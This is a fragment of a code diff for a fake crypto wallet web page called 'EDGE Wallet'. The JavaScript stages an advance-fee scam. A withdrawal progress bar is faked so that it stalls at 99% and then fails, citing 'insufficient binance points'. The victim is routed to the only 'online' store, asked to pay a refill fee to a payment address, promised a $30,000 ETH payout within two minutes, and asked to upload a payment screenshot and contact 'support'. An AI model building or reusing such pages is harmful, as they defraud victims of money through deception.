+    <input type="text" id="withdrawAddr" placeholder="Enter destination ETH address" required autocomplete="off" value="${state.eth}">
+    <button class="button" id="confirmWithdraw">Confirm Withdraw</button>
+  `;
+  app.appendChild(modal);
+
+  modal.querySelector('#confirmWithdraw').onclick = () => {
+    const addr = modal.querySelector('#withdrawAddr').value.trim();
+    if (!/^0x[a-fA-F0-9]{40}$/.test(addr)) {
+      modal.querySelector('#withdrawAddr').style.borderColor = "#e24c4b";
+      modal.querySelector('#withdrawAddr').focus();
+      return;
+    }
+    state.withdrawAddress = addr;
+    state.step = "withdraw-progress";
+    state.withdrawProgress = 1;
+    state.withdrawError = false;
+    render();
+    let pct = 1;
+    const timer = setInterval(() => {
+      pct += Math.floor(Math.random() * 18 + 7);
+      if (pct >= 99) pct = 99;
+      state.withdrawProgress = pct;
+      render();
+      if (pct >= 99) {
+        clearInterval(timer);
+        setTimeout(() => {
+          state.withdrawError = true;
+          state.step = "dashboard";
+          render();
+        }, 600);
       }
-    };
-  </script>
+    }, 320);
+  };
+}
+
+function renderWithdrawProgress(app) {
+  const modal = document.createElement('div');
+  modal.className = 'edge-card';
+  modal.style.position = "fixed";
+  modal.style.top = "50%";
+  modal.style.left = "50%";
+  modal.style.transform = "translate(-50%,-50%)";
+  modal.style.zIndex = 250;
+  modal.style.textAlign = "center";
+  modal.innerHTML = `
+    <h3>Processing withdrawal...</h3>
+    <div class="progress-bar"><div class="progress-bar-inner" style="width:${state.withdrawProgress}%;"></div></div>
+    <div style="margin-top:.5em;">${state.withdrawProgress}%</div>
+  `;
+  app.appendChild(modal);
+}
+
+function renderWithdrawError(app) {
+  const modal = document.createElement('div');
+  modal.className = 'edge-card';
+  modal.style.position = "fixed";
+  modal.style.top = "50%";
+  modal.style.left = "50%";
+  modal.style.transform = "translate(-50%,-50%)";
+  modal.style.zIndex = 300;
+  modal.innerHTML = `
+    <div class="error-msg">
+      <strong>Error:</strong> Your withdrawal of $${DEPOSIT_AMOUNT.toLocaleString()} to <span style="text-decoration:underline;">${state.withdrawAddress}</span> is <b>not successful</b> due to <b>insufficient binance points</b>.
+    </div>
+    <button class="button" id="getPointsBtn" style="margin-top:1.4em;">Get Points</button>
+  `;
+  app.appendChild(modal);
+  modal.querySelector('#getPointsBtn').onclick = () => {
+    state.step = "points";
+    render();
+  };
+}
+
+function renderPointsModal(app) {
+  const modal = document.createElement('div');
+  modal.className = 'edge-card';
+  modal.style.position = "fixed";
+  modal.style.top = "50%";
+  modal.style.left = "50%";
+  modal.style.transform = "translate(-50%,-50%)";
+  modal.style.zIndex = 350;
+  modal.innerHTML = `
+    <h3>Get Binance Points</h3>
+    <div class="store-list">
+      <button class="store-btn offline" id="store1">Store: CryptoHub <span style="color:#aaa;">Offline</span></button>
+      <button class="store-btn online" id="store2">Store: BinanceDirect <span style="color:var(--edge-green);">Online</span></button>
+      <button class="store-btn offline" id="store3">Store: EtherShop <span style="color:#aaa;">Offline</span></button>
+    </div>
+    <button class="button" id="closePoints" style="margin-top:.6em;">Close</button>
+  `;
+  app.appendChild(modal);
+
+  modal.querySelector('#store1').onclick = () => {
+    alert('Sorry, unable to sell ETHEREUM POINTS at this time.');
+  };
+  modal.querySelector('#store3').onclick = () => {
+    alert('Sorry, unable to sell ETHEREUM POINTS at this time.');
+  };
+  modal.querySelector('#store2').onclick = () => {
+    state.step = "refill";
+    render();
+  };
+  modal.querySelector('#closePoints').onclick = () => {
+    state.step = "dashboard";
+    state.withdrawError = false;
+    render();
+  };
+}
+
+function renderRefillModal(app) {
+  const modal = document.createElement('div');
+  modal.className = 'edge-card';
+  modal.style.position = "fixed";
+  modal.style.top = "50%";
+  modal.style.left = "50%";
+  modal.style.transform = "translate(-50%,-50%)";
+  modal.style.zIndex = 400;
+  modal.innerHTML = `
+    <h3>Refill ETH Points</h3>
+    <div style="font-size:1.07em; margin-bottom:1.1em;">
+      Needed points for withdrawal: <b>${BINANCE_POINTS_NEEDED} ETH points 🔑</b><br>
+      You currently have: <b>${state.points} ETH points 🔑</b><br>
+      Refill <span style="color:var(--edge-green);font-weight:700;">binance points $${BINANCE_POINTS_REFILL_COST} USD</span>
+    </div>
+    <div style="margin-bottom:1em;">
+      Payment Address:<br>
+      <span style="font-size:1.02em;font-weight:500;letter-spacing:0.02em">${REFILL_ADDRESS}</span>
+      <button class="copy-btn" id="copyRefillBtn">Copy</button>
+      <span id="copySuccess" style="margin-left:.6em; color:var(--edge-green); font-size:0.99em; display:none;">Copied!</span>
+    </div>
+    <button class="button" id="refillPaidBtn" style="margin-bottom:.5em;">I have paid</button>
+    <button class="button" id="closeRefill" style="background:#ccc;color:#444;">Close</button>
+    <div class="notification" style="background:#f6faff; color:#1d2330; margin-top:1.2em;">
+      <strong>🔔Important Withdrawal Notification:</strong><br><br>
+      Dear Customer, once you accumulate the necessary points for your withdrawal, please be assured that your request for $30,000 ETHEREUM will be processed to your designated ETH address within a maximum of just 2 minutes. Your security is our top priority; ETHEREUM SOFTWARE continuously monitors all transactions and activities associated with EDGE Pay to ensure everything is safe and secure. Thank you for choosing EDGE WALLET!
+      <button class="close" id="closeNotice2" style="top:.6em;">&times;</button>
+    </div>
+  `;
+  app.appendChild(modal);
+
+  modal.querySelector('#closeRefill').onclick = () => {
+    state.step = "dashboard";
+    render();
+  };
+  modal.querySelector('#closeNotice2').onclick = () => {
+    document.querySelectorAll('.notification').forEach(e=>e.style.display='none');
+  };
+  modal.querySelector('#copyRefillBtn').onclick = () => {
+    navigator.clipboard.writeText(REFILL_ADDRESS);
+    modal.querySelector('#copySuccess').style.display = 'inline';
+    setTimeout(()=>{modal.querySelector('#copySuccess').style.display='none';}, 1500);
+  };
+  modal.querySelector('#refillPaidBtn').onclick = () => {
+    state.step = "await-payment";
+    render();
+  };
+}
+
+function renderAwaitPaymentModal(app) {
+  const modal = document.createElement('div');
+  modal.className = 'edge-card';
+  modal.style.position = "fixed";
+  modal.style.top = "50%";
+  modal.style.left = "50%";
+  modal.style.transform = "translate(-50%,-50%)";
+  modal.style.zIndex = 420;
+  modal.innerHTML = `
+    <h3>Awaiting Deposit</h3>
+    <div style="font-size:1.09em; margin-bottom:1.2em;">
+      Store is awaiting your deposit of <b>$${BINANCE_POINTS_REFILL_COST} USD</b>.<br>
+      <span style="color:#888;font-size:0.97em">Please send payment to the address above.</span>
+    </div>
+    <button class="button" id="havePaidBtn">I have paid</button>
+    <button class="button" id="closeAwait" style="background:#ccc;color:#444;">Back</button>
+  `;
+  app.appendChild(modal);
+
+  modal.querySelector('#closeAwait').onclick = () => {
+    state.step = "refill";
+    render();
+  };
+  modal.querySelector('#havePaidBtn').onclick = () => {
+    state.step = "upload";
+    render();
+  };
+}
+
+function renderUploadModal(app) {
+  const modal = document.createElement('div');
+  modal.className = 'edge-card';
+  modal.style.position = "fixed";
+  modal.style.top = "50%";
+  modal.style.left = "50%";
+  modal.style.transform = "translate(-50%,-50%)";
+  modal.style.zIndex = 440;
+  modal.innerHTML = `
+    <h3>Upload Payment Screenshot</h3>
+    <div class="upload-section">
+      <input type="file" id="screenshotInput" accept="image/*" style="margin-bottom:1.2em;">
+      <div id="uploadedPreview"></div>
+      <button class="button" id="submitScreenshot" disabled>Submit &amp; Contact Support</button>
+    </div>
+  `;
+  app.appendChild(modal);
+
+  const fileInput = modal.querySelector('#screenshotInput');
+  const preview = modal.querySelector('#uploadedPreview');
+  const submitBtn = modal.querySelector('#submitScreenshot');
+
+  fileInput.onchange = function() {
+    const file = fileInput.files[0];
+    if (file && file.type.startsWith('image/')) {
+      const reader = new FileReader();
+      reader.onload = function(e) {
+        preview.innerHTML = `<img src="${e.target.result}" alt="Screenshot" style="max-width:100%;margin:1em auto 0.7em auto;border-radius:8px;box-shadow:0 2px 10px #e6eaf7;">`;
+        state.paymentScreenshot = e.target.result;
+        submitBtn.disabled = false;
+      };
+      reader.readAsDataURL(file);
+    }
+  };
+  submitBtn.onclick = () => {
+    state.step = "support";
+    render();
+  };
+}
+
+function renderSupportModal(app) {
+  const modal = document.createElement('div');
+  modal.className = 'edge-card';
+  modal.style.position = "fixed";
+  modal.style.top = "50%";
+  modal.style.left = "50%";
+  modal.style.transform = "translate(-50%,-50%)";
+  modal.style.zIndex = 460;
+  modal.innerHTML = `
+    <h3>Support Confirmation</h3>
+    <div style="font-size:1.09em; margin:1.1em 0 1.5em 0;">
+      You'll get a confirmation shortly, processed with <b>Support 💬</b>.<br>
+      Please provide a screenshot of your deposit so you can carry out your withdrawal in just 2 minutes maximum.
+    </div>
+    <div class="support-link">
+      <a href="${SUPPORT_URL}" target="_blank">Contact Support</a>
+    </div>
+    <button class="button" id="backToDashboard" style="margin-top:2em;">Return to Dashboard</button>
+  `;
+  app.appendChild(modal);
+
+  modal.querySelector('#backToDashboard').onclick = () => {
+    state.step = "dashboard";
+    render();
+  };
+}
+
+/* --- INIT --- */
+window.addEventListener('DOMContentLoaded', () => {
+  loadState();
+  if (state.dashboardUnlocked) {
+    state.step = "dashboard";
+  }
+  render();
+});
+</script>
 </body>
 </html>
